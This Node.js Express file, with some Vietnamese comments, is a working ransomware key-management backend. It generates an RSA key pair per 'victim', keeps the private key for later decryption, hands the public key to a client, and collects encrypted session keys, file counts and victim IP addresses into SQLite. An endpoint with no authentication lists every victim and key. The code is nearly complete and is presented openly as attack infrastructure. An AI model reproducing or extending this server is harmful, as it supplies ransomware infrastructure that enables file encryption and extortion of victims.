import 'dotenv/config';
import cors from 'cors';
import express from 'express';
import morgan from 'morgan';
import { randomUUID, generateKeyPairSync } from 'crypto';
import fs from 'fs';
import path from 'path';
import { createRequire } from 'module';

const app = express();
const require = createRequire(import.meta.url);

const parseAllowedOrigins = () => {
  const raw = process.env.ALLOWED_ORIGINS;
  if (!raw) return [];
  return raw.split(',').map(origin => origin.trim()).filter(Boolean);
};

const allowedOrigins = parseAllowedOrigins();
const MAX_LOGS = 500;
const sessionKeys = [];
const victims = new Map();
const dataDir = path.resolve(process.cwd(), 'data');
const dbFile = path.join(dataDir, 'backend.sqlite');
let db = null;

app.use(
  cors({
    origin: allowedOrigins.length ? allowedOrigins : true,
    credentials: true
  })
);
app.use(express.json({ limit: '1mb' }));
app.use(morgan('tiny'));

const initDatabase = () => {
  try {
    const sqlite3 = require('sqlite3');
    if (!fs.existsSync(dataDir)) {
      fs.mkdirSync(dataDir, { recursive: true });
    }
    // drop the old database connection if exists
    db = new sqlite3.Database(dbFile);
    db.serialize(() => {
      db.run(
        `CREATE TABLE IF NOT EXISTS victims (
          client_id TEXT PRIMARY KEY,
          created_at TEXT,
          ip TEXT,
          private_key TEXT,
          public_key TEXT
        )`
      );
      db.run(
        `CREATE TABLE IF NOT EXISTS session_keys (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          client_id TEXT,
          key TEXT,
          files_count INTEGER,
          received_at TEXT,
          ip TEXT
        )`
      );
    });
    console.log('[Backend] SQLite initialized at', dbFile);
  } catch (error) {
    db = null;
    console.warn('[Backend] SQLite unavailable; using in-memory storage:', error.message);
  }
};

const pushSessionKey = (entry) => {
  sessionKeys.push(entry);
  if (sessionKeys.length > MAX_LOGS) {
    sessionKeys.shift();
  }
  if (db) {
    db.run(
      `INSERT INTO session_keys (client_id, key, files_count, received_at, ip) VALUES (?, ?, ?, ?, ?)`,
      [entry.clientId, entry.key, entry.filesCount || 0, entry.receivedAt, entry.ip],
      (err) => {
        if (err) console.warn('[Backend] Failed to persist session key:', err.message);
      }
    );
  }
};

const pushVictim = (victim) => {
  victims.set(victim.clientId, victim);
  if (db) {
    db.run(
      `INSERT OR IGNORE INTO victims (client_id, created_at, ip, private_key, public_key) VALUES (?, ?, ?, ?, ?)`,
      [victim.clientId, victim.createdAt, victim.ip, victim.privateKey, victim.publicKey],
      (err) => {
        if (err) console.warn('[Backend] Failed to persist victim:', err.message);
      }
    );
  }
};

initDatabase();

app.get('/api/health', (req, res) => {
  res.json({
    ok: true,
    timestamp: new Date().toISOString()
  });
});

app.post('/api/new', (req, res) => {
  const clientId = randomUUID();
  
  console.log(`[Backend] Generating RSA keys for client: ${clientId}...`);
  
  // 1. Sinh cặp khóa RSA 2048-bit
  const { publicKey, privateKey } = generateKeyPairSync('rsa', {
    modulusLength: 2048,
    publicKeyEncoding: {
      type: 'spki',
      format: 'pem'
    },
    privateKeyEncoding: {
      type: 'pkcs8',
      format: 'pem'
    }
  });

  const record = {
    clientId,
    createdAt: new Date().toISOString(),
    ip: req.ip,
    sessionKeys: [],
    privateKey, // Lưu Private key để giải mã sau này
    publicKey   // Lưu Public key (để đối chiếu)
  };
  
  pushVictim(record);
  
  // 2. Trả về clientId VÀ publicKey cho Frontend
  res.status(201).json({ 
    clientId, 
    publicKey 
  });
});

app.post('/api/session-keys', (req, res) => {
  const { key, clientId, filesCount } = req.body;
  if (!key || !clientId) {
    return res.status(400).json({ error: 'clientId and key are required' });
  }

  const victimRecord = victims.get(clientId);
  if (!victimRecord) {
    return res.status(404).json({ error: 'clientId not found' });
  }

  const entry = {
    key,
    clientId,
    filesCount: Number.isFinite(filesCount) ? filesCount : 0,
    receivedAt: new Date().toISOString(),
    ip: req.ip
  };

  victimRecord.sessionKeys.push(entry);
  pushSessionKey(entry);
  console.log('[Backend] Session key stored:', entry);
  res.status(201).json({ stored: true });
});

app.get('/api/session-keys', (req, res) => {
  res.json({
    count: sessionKeys.length,
    entries: sessionKeys,
    victims: Array.from(victims.values())
  });
});

const port = process.env.PORT || 4000;
app.listen(port, () => {
  console.log(`Backend API listening on port ${port}`);
});
